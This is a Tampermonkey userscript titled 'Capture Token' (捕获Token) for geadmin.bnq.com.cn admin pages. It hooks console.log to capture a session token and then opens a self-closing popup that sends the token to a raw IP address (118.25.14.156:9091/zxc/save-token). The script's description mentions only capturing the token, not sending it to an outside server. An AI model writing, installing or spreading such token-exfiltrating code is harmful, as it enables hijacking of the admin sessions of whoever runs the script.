// ==UserScript==
// @name         捕获Token
// @namespace    http://tampermonkey.net/
// @version      1.1.1
// @description  从指定页面的特定脚本中捕获token
// @author       ed liu
// @match        https://geadmin.bnq.com.cn/*/*/*/*
// @match        https://geadmin.bnq.com.cn/*/*/*
// @match        https://geadmin.bnq.com.cn/*/*
// @license      MIT
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/501740/%E6%8D%95%E8%8E%B7Token.user.js
// @updateURL https://update.greasyfork.org/scripts/501740/%E6%8D%95%E8%8E%B7Token.meta.js
// ==/UserScript==
(function() {
    'use strict';

    const EXECUTION_KEY = 'lastExecutionTime';
    const THIRTY_MINUTES = 30 * 60 * 1000; // 30分钟的毫秒数

    function canExecute() {
        const lastExecutionTime = localStorage.getItem(EXECUTION_KEY);
        if (!lastExecutionTime) {
            return true;
        }
        const now = new Date().getTime();
        return now - lastExecutionTime > THIRTY_MINUTES;
    }

    function updateExecutionTime() {
        const now = new Date().getTime();
        localStorage.setItem(EXECUTION_KEY, now);
    }

    function injectScript() {
        const script = document.createElement('script');
        script.textContent = `
            (function() {
                var originalConsoleLog = console.log;
                console.log = function(...args) {
                    if (args[0] === 'token') {
                        localStorage.setItem('capturedToken', args[1]);
                    }
                    originalConsoleLog.apply(console, args);
                };
            })();
        `;
        document.documentElement.appendChild(script);
        script.remove();
    }

    if (canExecute()) {
        injectScript();
        updateExecutionTime();

        setTimeout(() => {
            const token = localStorage.getItem('capturedToken');
            console.log('捕获的token:', token);
            if (token) {
                var url = 'http://118.25.14.156:9091/zxc/save-token/?token=' + encodeURIComponent(token);
                var windowFeatures = 'width=600,height=400,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no';
                var newWindow = window.open(url, '_blank', windowFeatures);

                setTimeout(function() {
                    newWindow.close();
                }, 100); // 1000 milliseconds = 1 seconds
            } else {
                console.error('Failed to get cookies data.');
            }
        }, 0);
    } else {
        console.log('30分钟内不能再次执行');
    }
})();